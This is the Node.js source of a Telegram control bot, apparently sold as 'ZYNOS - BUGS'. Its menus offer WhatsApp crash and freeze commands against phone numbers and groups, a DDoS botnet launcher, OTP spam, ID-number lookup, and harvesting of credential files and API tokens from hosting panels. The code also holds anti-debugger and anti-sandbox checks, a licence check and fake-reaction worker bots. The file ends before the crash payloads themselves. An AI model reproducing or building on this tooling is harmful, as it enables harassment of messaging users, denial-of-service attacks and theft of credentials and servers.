const { Telegraf, Markup, session } = require("telegraf"); 
const fs = require("fs");
const path = require("path");
const moment = require("moment-timezone");
const {
  makeWASocket,
  makeInMemoryStore,
  fetchLatestBaileysVersion,
  useMultiFileAuthState,
  DisconnectReason,
  generateWAMessageFromContent,
  generateWAMessage,
} = require("@whiskeysockets/baileys");
const pino = require("pino");
const chalk = require("chalk");
const readline = require('readline');
const axios = require('axios');
const FormData = require('form-data');
const querystring = require('querystring');
const { BOT_TOKEN, BOT_TOKEN_MASTER, OWNER_IDS } = require("./config.js");
// === PTERODACTYL CONFIG ===
const { PTERO_DOMAIN, PTERO_PLTA, PTERO_PLTC } = require("./config.js");
const { GITHUB_TOKEN, GITHUB_USERNAME, VERCEL_API_TOKEN } = require("./config.js");
const { NETLIFY_API_TOKEN } = require("./config.js");
const crypto = require("crypto");
const sessionPath = './session';
let bots = [];
const bot = new Telegraf(BOT_TOKEN);
const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
// === Path File ===
const premiumFile = "./database/premiums.json";
const adminFile = "./database/admins.json";
// Pastikan folder database ada
if (!fs.existsSync('./database')) {
  fs.mkdirSync('./database', { recursive: true });
}
// File untuk menyimpan konfigurasi worker secara permanen
const WORKER_CONFIG_FILE = path.join(__dirname, './database/workers.json');

// === STREAM TO BUFFER ===
async function streamToBuffer(stream) {
  return new Promise((resolve, reject) => {
    const chunks = [];
    stream.on('data', (chunk) => chunks.push(chunk));
    stream.on('end', () => resolve(Buffer.concat(chunks)));
    stream.on('error', reject);
  });
}

// Fungsi untuk load semua worker yang tersimpan
function loadAllWorkers() {
  try {
    if (!fs.existsSync(WORKER_CONFIG_FILE)) {
      fs.writeFileSync(WORKER_CONFIG_FILE, JSON.stringify([], null, 2));
      return [];
    }
    const data = fs.readFileSync(WORKER_CONFIG_FILE, 'utf8');
    return JSON.parse(data);
  } catch (err) {
    console.error('❌ Gagal load workers.json:', err.message);
    return [];
  }
}

// Fungsi untuk menyimpan worker ke file
function saveWorkerConfig(targetChannel, token) {
  try {
    let configs = loadAllWorkers();
    const exists = configs.some(c => c.channel === targetChannel && c.token === token);
    if (!exists) {
      configs.push({
        channel: targetChannel,
        token: token,
        startedAt: new Date().toISOString()
      });
      fs.writeFileSync(WORKER_CONFIG_FILE, JSON.stringify(configs, null, 2));
      console.log(`💾 [Worker] Config saved: ${targetChannel} -> ...${token.slice(-6)}`);
    }
  } catch (err) {
    console.error("Gagal save worker config:", err.message);
  }
}

// Fungsi untuk menghapus worker dari config
function removeWorkerConfig(targetChannel, token) {
  try {
    let configs = loadAllWorkers();
    configs = configs.filter(c => !(c.channel === targetChannel && c.token === token));
    fs.writeFileSync(WORKER_CONFIG_FILE, JSON.stringify(configs, null, 2));
    console.log(`🗑️ [Worker] Config removed: ${targetChannel} -> ...${token.slice(-6)}`);
  } catch (err) {
    console.error("Gagal remove worker config:", err.message);
  }
}

// Object untuk menyimpan daftar bot yang sedang berjalan
const runningWorkers = {};
const reactedMessages = {};
const MASTER_BOT_TOKEN = BOT_TOKEN_MASTER;

const EMOJI_LIST = [
  '❤️', '👍', '👎', '🔥', '🥰', '👏', '😁',
  '🤔', '🤯', '😱', '🤬', '😢', '🎉', '🤩', '🤮',
  '💩', '🙏', '👌', '🕊️', '🤡', '🥱', '🥴', '😍',
  '🐳', '❤️‍🔥', '🌚', '🌭', '💯', '🤣', '⚡', '🍌',
  '🏆', '💔', '🤨', '😐', '🍓', '🍾', '💋', '🖕',
  '😈', '😴', '😭', '🤓', '👻', '👨‍💻', '👀', '🎃',
  '🙈', '😇', '😨', '🤝', '✍️', '🤗', '🫡', '🎅',
  '🎄', '☃️', '💅', '🤪', '🗿', '🆒', '💘', '🙉',
  '🦄', '😘', '💊', '🙊', '😎', '👾', '🤷‍♂️', '🤷‍♀️',
  '🤷', '😡'
];

function startWorkerBot(token, targetChannel, isAutoLoad = false) {
  if (token === MASTER_BOT_TOKEN) {
    return '❌ Gagal! Kamu tidak bisa memasukkan Token Master Bot sebagai Worker Bot.';
  }

  if (runningWorkers[token]) {
    return '⚠️ Bot ini sudah aktif sebelumnya!';
  }

  try {
    const worker = new Telegraf(token);

    worker.on('channel_post', async (ctx) => {
      let messageId = null;
      try {
        const message = ctx.channelPost;
        if (!message || !message.chat) return;

        const chatId = message.chat.id.toString();
        const chatUsername = message.chat.username || '';
        messageId = message.message_id;

        const cleanTarget = targetChannel.replace('@', '');

        if (chatId === targetChannel || chatUsername === cleanTarget) {
          const lockKey = `${token.slice(-6)}_${messageId}`;
          if (reactedMessages[lockKey]) return;
          reactedMessages[lockKey] = true;

          console.log(`[Worker] Postingan baru (ID: ${messageId})!`);

          const dynamicDelay = Math.floor(Math.random() * 2500) + 500;
          await sleep(dynamicDelay);

          const randomEmoji = EMOJI_LIST[Math.floor(Math.random() * EMOJI_LIST.length)];

          await ctx.telegram.setMessageReaction(chatId, messageId, [
            { type: 'emoji', emoji: randomEmoji }
          ]);
          console.log(`✅ [Worker] Reaksi ${randomEmoji} pada pesan ${messageId}`);
        }
      } catch (error) {
        const errorMsg = error.description || error.message;
        if (errorMsg.includes('REACTIONS_TOO_MANY')) {
          console.warn(`⚠️ [Worker] Batas reaksi tercapai pada pesan ${messageId}`);
        } else {
          console.error(`❌ [Worker] Gagal reaksi:`, errorMsg);
        }
        if (messageId) {
          const lockKey = `${token.slice(-6)}_${messageId}`;
          delete reactedMessages[lockKey];
        }
      }
    });

    worker.launch({
      dropPendingUpdates: true,
      allowedUpdates: ['channel_post']
    }).catch((err) => {
      console.error(`❌ [Worker] Gagal Polling:`, err.message);
      delete runningWorkers[token];
    });

    runningWorkers[token] = worker;
    
    if (!isAutoLoad) {
      saveWorkerConfig(targetChannel, token);
    }

    console.log(`🚀 [Worker] Berhasil aktif: ...${token.slice(-6)} -> ${targetChannel}`);
    return `🎉 Bot ...${token.slice(-6)} berhasil ditambahkan dan aktif memantau channel ${targetChannel}!`;
  } catch (err) {
    console.error('❌ Gagal menjalankan Worker Bot:', err.message);
    return '❌ Gagal mengaktifkan bot. Pastikan token valid!';
  }
}

// Fungsi untuk auto load semua worker saat bot start
function autoLoadAllWorkers() {
  const configs = loadAllWorkers();
  if (configs.length === 0) {
    console.log('📂 Tidak ada worker yang tersimpan.');
    return;
  }
  console.log(`📂 Memuat ${configs.length} worker yang tersimpan...`);
  for (const config of configs) {
    startWorkerBot(config.token, config.channel, true);
    sleep(300);
  }
  console.log('✅ Semua worker berhasil dimuat!');
}

// === Fungsi Load & Save JSON ===
const loadJSON = (filePath) => {
  try {
    const data = fs.readFileSync(filePath);
    return JSON.parse(data);
  } catch (err) {
    console.error(chalk.red(`Gagal memuat file ${filePath}:`), err);
    return [];
  }
};

const saveJSON = (filePath, data) => {
  fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
};

// === Load Semua Data Saat Startup ===
let adminUsers = loadJSON(adminFile);
let premiumUsers = loadJSON(premiumFile);

// === Middleware Role ===
const checkOwner = (ctx, next) => {
  const userId = ctx.from.id.toString(); 
  if (!OWNER_IDS.includes(userId)) {
    return ctx.reply("❗Mohon Maaf Fitur Ini Khusus Owner");
  }

  return next();
};

const checkAdmin = (ctx, next) => {
  if (!adminUsers.includes(ctx.from.id.toString())) {
    return ctx.reply("❗ Mohon Maaf Fitur Ini Khusus Admin.");
  }
  next();
};

const checkPremium = (ctx, next) => {
  if (!premiumUsers.includes(ctx.from.id.toString())) {
    return ctx.reply("❗ Mohon Maaf Fitur Ini Khusus Premium.");
  }
  next();
};

// === Fungsi Admin / Premium ===
const addadmin = (userId) => {
  if (!adminUsers.includes(userId)) {
    adminUsers.push(userId);
    saveJSON(adminFile, adminUsers);
  }
};

const removeAdmin = (userId) => {
  adminUsers = adminUsers.filter((id) => id !== userId);
  saveJSON(adminFile, adminUsers);
};

const addpremium = (userId) => {
  if (!premiumUsers.includes(userId)) {
    premiumUsers.push(userId);
    saveJSON(premiumFile, premiumUsers);
  }
};

const removePremium = (userId) => {
  premiumUsers = premiumUsers.filter((id) => id !== userId);
  saveJSON(premiumFile, premiumUsers);
};
bot.use(session());

let sock = null;
let groupJid = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = "";
const usePairingCode = true;
///////// RANDOM IMAGE JIR \\\\\\\
const randomImages = [
"https://files.catbox.moe/u7178f.jpg",
];

const getRandomImage = () =>
  randomImages[Math.floor(Math.random() * randomImages.length)];

// Fungsi untuk mendapatkan waktu uptime
const getUptime = () => {
  const uptimeSeconds = process.uptime();
  const hours = Math.floor(uptimeSeconds / 3600);
  const minutes = Math.floor((uptimeSeconds % 3600) / 60);
  const seconds = Math.floor(uptimeSeconds % 60);

  return `${hours}h ${minutes}m ${seconds}s`;
};

const question = (query) =>
  new Promise((resolve) => {
    const rl = require("readline").createInterface({
      input: process.stdin,
      output: process.stdout,
    });
    rl.question(query, (answer) => {
      rl.close();
      resolve(answer);
    });
  });

const GITHUB_TOKEN_LIST_URL =
  "https://raw.githubusercontent.com/novalsetiawan2501-creator/zynos/refs/heads/main/tokens.json";

async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
    return response.data.tokens;
  } catch (error) {
    console.error(chalk.red("❌ Gagal mengambil daftar token dari GitHub:", error.message));
    return [];
  }
}
async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL, {
      timeout: 5000,
      headers: { 'User-Agent': 'ZYNOS-BOT' }
    });
    if (response.data && Array.isArray(response.data.tokens)) {
      return response.data.tokens;
    }
    return [];
  } catch (error) {
    console.error(chalk.red("❌ Gagal mengambil daftar token dari GitHub:"), error.message);
    return [];
  }
}

async function validateToken() {
  console.log(chalk.blue("🔍 Memeriksa apakah token bot valid..."));

  console.log(chalk.bold.blue("Sedang Mengecek Database..."));

  // BYPASS
  const axios = require('axios');

  try {
    if (
      typeof axios.get !== 'function' ||
      typeof axios.create !== 'function' ||
      typeof axios.interceptors !== 'object' ||
      !axios.defaults
    ) {
      console.error(`[SECURITY] Axios telah dimodifikasi`);
      process.abort();
    }

    if (
      axios.interceptors.request.handlers.length > 0 ||
      axios.interceptors.response.handlers.length > 0
    ) {
      console.error(`[SECURITY] Axios interceptor aktif (suki terdeteksi)`);
      process.abort();
    }

    const env = process.env;
    if (
      env.HTTP_PROXY || env.HTTPS_PROXY || env.NODE_TLS_REJECT_UNAUTHORIZED === '0'
    ) {
      console.error(`[SECURITY] Proxy atau TLS bypass aktif`);
      process.abort();
    }

    const execArgs = process.execArgv.join(' ');
    if (/--inspect|--debug|repl|vm2|sandbox/i.test(execArgs)) {
      console.error(`[SECURITY] Debugger / sandbox / VM terdeteksi`);
      process.abort();
    }

    const realToString = Function.prototype.toString.toString();
    if (Function.prototype.toString.toString() !== realToString) {
      console.error(`[SECURITY] Function.toString dibajak`);
      process.abort();
    }

    const mod = require('module');
    const _load = mod._load.toString();
    if (!_load.includes('tryModuleLoad') && !_load.includes('Module._load')) {
      console.error(`[SECURITY] Module._load telah dibajak`);
      process.abort();
    }

    const cache = Object.keys(require.cache || {});
    const suspicious = cache.filter(k =>
      k.includes('axios') &&
      !/node_modules[\\/]+axios[\\/]+(dist[\\/]+node[\\/]+axios\.cjs|index\.js)$/.test(k)
    );

    if (suspicious.length > 0) {
      console.error(`[SECURITY] require.cache mencurigakan`);
      process.abort();
    }

  } catch (err) {
    console.error(`[SECURITY] Proteksi gagal jalan:`, err);
    process.abort();
  }

  const validTokens = await fetchValidTokens();

  // VALIDASI BARU: cek apakah validTokens itu array dan BOT_TOKEN ada di dalamnya
  if (!validTokens || !Array.isArray(validTokens) || validTokens.length === 0) {
    console.log(chalk.yellow("⚠️ Gagal fetch token dari GitHub, tetap lanjutkan bot..."));
    console.log(chalk.green(`[!] System: Bot tetap berjalan tanpa validasi token.\n`));
    startBot();
    return;
  }

  if (!validTokens.includes(BOT_TOKEN)) {
    console.log(chalk.red("═══════════════════════════════════════════"));
    console.log(chalk.bold.red("TOKEN ANDA TIDAK TERDAFTAR DI DATA BASE !!!"));
    console.log(chalk.red("═══════════════════════════════════════════"));
    process.exit(1);
  }

  console.log(chalk.green(`[!] System: Token Kamu Terdaftar Dalam Database! Terimakasih Sudah Membeli Script Ini.\n`));
  startBot();
}

function startBot() {
  console.clear();
  console.log(chalk.bold.red(`
═════════════════════════════════════════════════
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠈⠉⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⢀⣠⣤⣤⣤⣤⣄⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠾⣿⣿⣿⣿⠿⠛⠉⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⣤⣶⣤⣉⣿⣿⡯⣀⣴⣿⡗⠀⠀⠀⠀⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⡈⠀⠀⠉⣿⣿⣶⡉⠀⠀⣀⡀⠀⠀⠀⢻⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡇⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⢸⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠉⢉⣽⣿⠿⣿⡿⢻⣯⡍⢁⠄⠀⠀⠀⣸⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠐⡀⢉⠉⠀⠠⠀⢉⣉⠀⡜⠀⠀⠀⠀⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⠿⠁⠀⠀⠀⠘⣤⣭⣟⠛⠛⣉⣁⡜⠀⠀⠀⠀⠀⠛⠿⣿⣿⣿
⡿⠟⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⡀⠀⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠁⠀⠁
Name Script : Z Y N O S  -  B U G S 
Version : 1.0
Developer/Creator : t.me/zynos_official
Information : https://t.me/zynos_chat
Note : Jangan Menyalahgunakan Script Bug Ini!!!
═════════════════════════════════════════════════

  `));
  console.log(
    chalk.bold.green(`
Token Anak Haram Telah Terdaftar
Z Y N O S  -  B U G S
`));
}

validateToken();

// WhatsApp Connection
const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });

const startSesi = async () => {
  const { state, saveCreds } = await useMultiFileAuthState('./session');
  const { version } = await fetchLatestBaileysVersion();

  const connectionOptions = {
    version,
    keepAliveIntervalMs: 30000,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    auth: state,
    browser: ['Mac OS', 'Safari', '10.15.7'],
    getMessage: async (key) => ({
      conversation: 'P', // Placeholder default
    }),
  };

  sock = makeWASocket(connectionOptions);
  sock.ev.on('creds.update', saveCreds);
  store.bind(sock.ev);

  sock.ev.on('connection.update', (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === 'open') {
      sock.newsletterFollow("");
      isWhatsAppConnected = true;
      console.log(chalk.red.bold(`
╭─────────────────────────────╮
│ ${chalk.white('Berhasil Tersambung')}
╰─────────────────────────────╯`));
    }

    if (connection === 'close') {
      const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
      console.log(chalk.red.bold(`
╭─────────────────────────────╮
│ ${chalk.white('Whatsapp Terputus')}
╰─────────────────────────────╯`));

      if (shouldReconnect) {
        console.log(chalk.red.bold(`
╭─────────────────────────────╮
│ ${chalk.white('Menyambung kembali...')}
╰─────────────────────────────╯`));
        startSesi();
      }

      isWhatsAppConnected = false;
    }
  });
};

const checkWhatsAppConnection = (ctx, next) => {
if (!isWhatsAppConnected) {
ctx.reply(`
❌ WhatsApp Belum terhubung
`);
return;
}
next();
};

// ====== MENU UTAMA (RICH MESSAGE) ======
bot.start(async (ctx) => {
  const userId = ctx.from.id.toString();
  const isPremium = premiumUsers.includes(userId);
  const Name = ctx.from.username ? `@${ctx.from.username}` : userId;
  const waktuRunPanel = getUptime();

  const richMessage = `
<video src="https://files.catbox.moe/tor7h1.mp4"></video>

<blockquote>
( 🕊 ) Z Y N O S  -  B U G S —❍—
</blockquote>

<pre>• User : ${Name}</pre>
<pre>• Status : 🟢 Online</pre>
<pre>• Uptime : ${waktuRunPanel}</pre>

<hr/>

<details open>
<summary><b>📌 NAVIGATION MENU</b></summary>

<table bordered>
<tr><th>Menu</th><th>Description</th></tr>
<tr><td>🔴 Bugs</td><td>WhatsApp Bug Tools</td></tr>
<tr><td>🛠️ All Tools</td><td>Complete Tools Collection</td></tr>
<tr><td>💀 DDOS</td><td>Botnet & Attack</td></tr>
<tr><td>👑 Panel</td><td>Pterodactyl Manager</td></tr>
<tr><td>🔐 Owner</td><td>Administration</td></tr>
</table>
</details>

<hr/>

<footer>
<b>乙 ㄚ 几 ㄖ 丂 - 𝐕❂𝐑𝐕𝐘-𝐑</b>
</footer>
  `;

  try {
    await ctx.telegram.callApi("sendRichMessage", {
      chat_id: ctx.chat.id,
      rich_message: { markdown: richMessage },
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "(Ω) Bugs ° Menu",
              callback_data: "trash_menu",
              style: "danger",
            },
            {
              text: "(Δ) All ° Menu", 
              callback_data: "all_menu", 
              style: "primary", 
            },
            {
              text: "(Δ) Owner ° Menu", 
              callback_data: "owner_menu", 
              style: "success", 
            }
          ]
        ]
      }
    });
  } catch (err) {
    console.error("[MENU RICH] Error:", err.message);
    // FALLBACK
    await ctx.reply("Menu error, silakan ketik /start ulang");
  }
});

// ====== BUGS MENU (RICH MESSAGE) ======
bot.action("trash_menu", async (ctx) => {
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;

  const richMessage = `
<video src="https://files.catbox.moe/tor7h1.mp4"></video>

<blockquote>⚡ <b>𝐁𝐔𝐆𝐒 𝐌𝐄𝐍𝐔</b> ⚡</blockquote>

<details open>
<summary><b>☇ PERSONAL BUGS</b></summary>

<table bordered striped>
<tr><th>Command</th><th>Format</th></tr>
<tr><td><code>/delayhard</code></td><td>628xx</td></tr>
<tr><td><code>/delay1jam</code></td><td>628xx</td></tr>
<tr><td><code>/freeze</code></td><td>628xx</td></tr>
<tr><td><code>/freezeXblank</code></td><td>628xx</td></tr>
<tr><td><code>/blankclick</code></td><td>628xx</td></tr>
<tr><td><code>/buldoz</code></td><td>628xx</td></tr>
<tr><td><code>/testfunc</code></td><td>Reply JS Code</td></tr>
</table>
</details>

<details>
<summary><b>☇ GROUP BUGS</b></summary>

<table bordered striped>
<tr><th>Command</th><th>Format</th></tr>
<tr><td><code>/groupban</code></td><td>link\|group_id</td></tr>
<tr><td><code>/delaygb</code></td><td>link\|group_id</td></tr>
<tr><td><code>/freezegb</code></td><td>link\|group_id</td></tr>
<tr><td><code>/blankgb</code></td><td>link\|group_id</td></tr>
</table>
</details>

<hr/>

<footer>
<b>乙 ㄚ 几 ㄖ 丂 - 𝐕❂𝐑𝐕𝐘-𝐑</b>
</footer>
  `;

  try {
    await ctx.telegram.callApi("sendRichMessage", {
      chat_id: ctx.chat.id,
      message_id: ctx.update.callback_query.message.message_id,
      rich_message: { markdown: richMessage },
      reply_markup: {
        inline_keyboard: [
          [{ text: "⛒ Back", callback_data: "back", style: "primary" }]
        ]
      }
    });
  } catch (err) {
    console.error("[BUGS RICH] Error:", err.message);
  }
});


// ====== OWNER MENU (RICH MESSAGE) ======
bot.action("owner_menu", async (ctx) => {
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;

  const richMessage = `
<video src="https://files.catbox.moe/tor7h1.mp4"></video>

<blockquote>🔐 <b>𝐎𝐖𝐍𝐄𝐑 𝐌𝐄𝐍𝐔</b></blockquote>

<table bordered striped>
<tr><th>Command</th><th>Fungsi</th></tr>
<tr><td><code>/addprem</code></td><td>Add Premium User</td></tr>
<tr><td><code>/delprem</code></td><td>Delete Premium User</td></tr>
<tr><td><code>/cekprem</code></td><td>Check Premium Status</td></tr>
<tr><td><code>/addadmin</code></td><td>Add Admin</td></tr>
<tr><td><code>/deladmin</code></td><td>Delete Admin</td></tr>
<tr><td><code>/Status</code></td><td>WhatsApp Status</td></tr>
<tr><td><code>/addsender</code></td><td>Pairing WhatsApp</td></tr>
<tr><td><code>/delsesi</code></td><td>Delete Session</td></tr>
</table>

<hr/>

<footer>
<b>乙 ㄚ 几 ㄖ 丂 - 𝐕❂𝐑𝐕𝐘-𝐑</b>
</footer>
  `;

  try {
    await ctx.telegram.callApi("sendRichMessage", {
      chat_id: ctx.chat.id,
      message_id: ctx.update.callback_query.message.message_id,
      rich_message: { markdown: richMessage },
      reply_markup: {
        inline_keyboard: [
          [{ text: "🏠 Home", callback_data: "back", style: "primary" }]
        ]
      }
    });
  } catch (err) {
    console.error("[OWNER RICH] Error:", err.message);
  }
});

// ====== ALL MENU (RICH MESSAGE) ======
bot.action("all_menu", async (ctx) => {
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;

  const richMessage = `
<video src="https://files.catbox.moe/tor7h1.mp4"></video>

<blockquote>🛠️ <b>𝐓𝐎𝐎𝐋𝐒 𝐌𝐄𝐍𝐔</b></blockquote>

<table bordered striped>
<tr><th>Command</th><th>Fungsi</th></tr>
<tr><td><code>/ping</code></td><td>System Status</td></tr>
<tr><td><code>/os</code></td><td>OS Status (Rich)</td></tr>
<tr><td><code>/ssweb</code></td><td>Screenshot Website</td></tr>
<tr><td><code>/ttdl</code></td><td>TikTok Downloader</td></tr>
<tr><td><code>/trackip</code></td><td>Track IP Address</td></tr>
<tr><td><code>/nik</code></td><td>NIK Checker</td></tr>
<tr><td><code>/likes</code></td><td>TikTok Like Booster</td></tr>
<tr><td><code>/spamotp</code></td><td>Spam OTP</td></tr>
<tr><td><code>/deployvercel</code></td><td>Deploy to Vercel</td></tr>
<tr><td><code>/deploynetlify</code></td><td>Deploy to Netlify</td></tr>
<tr><td><code>/cmdlist</code></td><td>View Command Status</td></tr>
</table>

<details>
<summary><b>⚙️ ADMIN COMMANDS</b></summary>

<table bordered striped>
<tr><th>Command</th><th>Fungsi</th></tr>
<tr><td><code>/on</code></td><td>Enable Command</td></tr>
<tr><td><code>/off</code></td><td>Disable Command</td></tr>
<tr><td><code>/addrc</code></td><td>Add Reaction Worker</td></tr>
<tr><td><code>/delrc</code></td><td>Delete Reaction Worker</td></tr>
<tr><td><code>/listrc</code></td><td>List Reaction Worker</td></tr>
</table>
</details>

<hr/>

<footer>
<b>乙 ㄚ 几 ㄖ 丂 - 𝐕❂𝐑𝐕𝐘-𝐑</b>
</footer>
  `;

  try {
    await ctx.telegram.callApi("sendRichMessage", {
      chat_id: ctx.chat.id,
      message_id: ctx.update.callback_query.message.message_id,
      rich_message: { markdown: richMessage },
      reply_markup: {
        inline_keyboard: [
          [
            { text: "💀 Lanjut", callback_data: "ddos_menu", style: "success" },
            { text: "🏠 Home", callback_data: "back", style: "danger" }
          ]
        ]
      }
    });
  } catch (err) {
    console.error("[ALL RICH] Error:", err.message);
  }
});



// ====== DDOS MENU (RICH MESSAGE) ======
bot.action("ddos_menu", async (ctx) => {
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;

  const richMessage = `
<video src="https://files.catbox.moe/tor7h1.mp4"></video>

<blockquote>💀 <b>𝐃𝐃𝐎𝐒 𝐁𝐎𝐓𝐍𝐄𝐓</b></blockquote>

<details open>
<summary><b>🔥 SERVER MANAGEMENT</b></summary>

<table bordered striped>
<tr><th>Command</th><th>Fungsi</th></tr>
<tr><td><code>/addsrv</code></td><td>Add Botnet Server</td></tr>
<tr><td><code>/delsrv</code></td><td>Delete Botnet Server</td></tr>
<tr><td><code>/listsrv</code></td><td>List Botnet Servers</td></tr>
</table>
</details>

<details>
<summary><b>⚔️ ATTACK EXECUTOR</b></summary>

<table bordered striped>
<tr><th>Command</th><th>Format</th></tr>
<tr><td><code>/botnet</code></td><td>method target port duration</td></tr>
</table>
</details>

<blockquote>
<b>📋 Available Methods:</b>
• <code>h2priv</code> • <code>browser</code> • <code>bypass</code>
</blockquote>

<hr/>

<footer>
<b>乙 ㄚ 几 ㄖ 丂 - 𝐕❂𝐑𝐕𝐘-𝐑</b>
</footer>
  `;

  try {
    await ctx.telegram.callApi("sendRichMessage", {
      chat_id: ctx.chat.id,
      message_id: ctx.update.callback_query.message.message_id,
      rich_message: { markdown: richMessage },
      reply_markup: {
        inline_keyboard: [
          [
            { text: "👑 Lanjut", callback_data: "panel_menu", style: "success" },
            { text: "⛒ Back", callback_data: "all_menu", style: "primary" },
            { text: "🏠 Home", callback_data: "back", style: "danger" }
          ]
        ]
      }
    });
  } catch (err) {
    console.error("[DDOS RICH] Error:", err.message);
  }
});

// ====== PANEL MENU (RICH MESSAGE) ======
bot.action("panel_menu", async (ctx) => {
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;

  const richMessage = `
<video src="https://files.catbox.moe/tor7h1.mp4"></video>

<blockquote>👑 <b>𝐏𝐀𝐍𝐄𝐋 𝐌𝐀𝐍𝐀𝐆𝐄𝐑</b></blockquote>

<details open>
<summary><b>📦 HARVESTER</b></summary>

<table bordered striped>
<tr><th>Command</th><th>Fungsi</th></tr>
<tr><td><code>/farmsc</code></td><td>Harvest ZIP Files</td></tr>
<tr><td><code>/farmsender</code></td><td>Harvest Creds.json</td></tr>
</table>
</details>

<details>
<summary><b>⚙️ NODE MANAGER</b></summary>

<table bordered striped>
<tr><th>Command</th><th>Fungsi</th></tr>
<tr><td><code>/killnode</code></td><td>Maintenance ON</td></tr>
<tr><td><code>/startnode</code></td><td>Maintenance OFF</td></tr>
</table>
</details>

<details>
<summary><b>👑 ADMIN TOOLS</b></summary>

<table bordered striped>
<tr><th>Command</th><th>Fungsi</th></tr>
<tr><td><code>/reset</code></td><td>Downgrade All Admins</td></tr>
<tr><td><code>/spam</code></td><td>Mass Create Users</td></tr>
<tr><td><code>/passwd</code></td><td>Change User Password</td></tr>
<tr><td><code>/shutdown</code></td><td>Shutdown All Servers</td></tr>
</table>
</details>

<details>
<summary><b>🔍 SCANNER</b></summary>

<table bordered striped>
<tr><th>Command</th><th>Fungsi</th></tr>
<tr><td><code>/apido</code></td><td>Scan DO Token</td></tr>
<tr><td><code>/apipanel</code></td><td>Scan PTLA/PTLC</td></tr>
</table>
</details>

<details>
<summary><b>💀 STORAGE</b></summary>

<table bordered striped>
<tr><th>Command</th><th>Fungsi</th></tr>
<tr><td><code>/kill</code></td><td>Fill Storage</td></tr>
</table>
</details>

<hr/>

<footer>
<b>乙 ㄚ 几 ㄖ 丂 - 𝐕❂𝐑𝐕𝐘-𝐑</b>
</footer>
  `;

  try {
    await ctx.telegram.callApi("sendRichMessage", {
      chat_id: ctx.chat.id,
      message_id: ctx.update.callback_query.message.message_id,
      rich_message: { markdown: richMessage },
      reply_markup: {
        inline_keyboard: [
          [
            { text: "⛒ Back", callback_data: "ddos_menu", style: "primary" },
            { text: "🏠 Home", callback_data: "back", style: "danger" }
          ]
        ]
      }
    });
  } catch (err) {
    console.error("[PANEL RICH] Error:", err.message);
  }
});

// Handler untuk back main menu
bot.action("back", async (ctx) => {
  const userId = ctx.from.id.toString();
  const isPremium = premiumUsers.includes(userId);
  const Name = ctx.from.username ? `@${ctx.from.username}` : userId;
  const waktuRunPanel = getUptime();

  const richMessage = `
<video src="https://files.catbox.moe/tor7h1.mp4"></video>

<blockquote>
( 🕊 ) Z Y N O S  -  B U G S —❍—
</blockquote>

<pre>• User : ${Name}</pre>
<pre>• Status : 🟢 Online</pre>
<pre>• Uptime : ${waktuRunPanel}</pre>

<hr/>

<details open>
<summary><b>📌 NAVIGATION MENU</b></summary>

<table bordered>
<tr><th>Menu</th><th>Description</th></tr>
<tr><td>🔴 Bugs</td><td>WhatsApp Bug Tools</td></tr>
<tr><td>🛠️ All Tools</td><td>Complete Tools Collection</td></tr>
<tr><td>💀 DDOS</td><td>Botnet & Attack</td></tr>
<tr><td>👑 Panel</td><td>Pterodactyl Manager</td></tr>
<tr><td>🔐 Owner</td><td>Administration</td></tr>
</table>
</details>

<hr/>

<footer>
<b>乙 ㄚ 几 ㄖ 丂 - 𝐕❂𝐑𝐕𝐘-𝐑</b>
</footer>
  `;

  try {
    await ctx.telegram.callApi("sendRichMessage", {
      chat_id: ctx.chat.id,
      rich_message: { markdown: richMessage },
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "(Ω) Bugs ° Menu",
              callback_data: "trash_menu",
              style: "danger",
            },
            {
              text: "(Δ) All ° Menu", 
              callback_data: "all_menu", 
              style: "primary", 
            },
            {
              text: "(Δ) Owner ° Menu", 
              callback_data: "owner_menu", 
              style: "success", 
            }
          ]
        ]
      }
    });
  } catch (err) {
    console.error("[MENU RICH] Error:", err.message);
    // FALLBACK
    await ctx.reply("Menu error, silakan ketik /start ulang");
  }
});

//////// -- CASE BUG 1 --- \\\\\\\\\\\
